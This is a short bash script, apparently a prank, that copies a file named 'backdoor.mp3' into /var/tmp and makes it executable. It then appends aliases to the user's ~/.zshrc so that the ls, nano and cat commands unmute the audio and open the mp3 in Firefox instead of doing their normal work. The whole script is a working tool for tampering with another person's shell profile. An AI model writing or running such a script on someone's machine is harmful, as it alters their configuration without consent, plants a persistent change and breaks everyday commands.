#!/bin/bash

SOUND="backdoor.mp3"
BACKDOOR_PATH="/var/tmp/"
cp $SOUND $BACKDOOR_PATH
chmod +x ${BACKDOOR_PATH}${SOUND}


function screw_up_profile() { 
sed -i -e "$ a alias ls='pacmd set-default-sink 0 && pactl set-sink-mute 0 false  && firefox /var/tmp/backdoor.mp3'" $1
sed -i -e "$ a alias nano='pacmd set-default-sink 0 && pactl set-sink-mute 0 false  && firefox /var/tmp/backdoor.mp3'" $1 
sed -i -e "$ a alias cat='pacmd set-default-sink 0 && pactl set-sink-mute 0 false  && firefox /var/tmp/backdoor.mp3'" $1
}

screw_up_profile ~/.zshrc
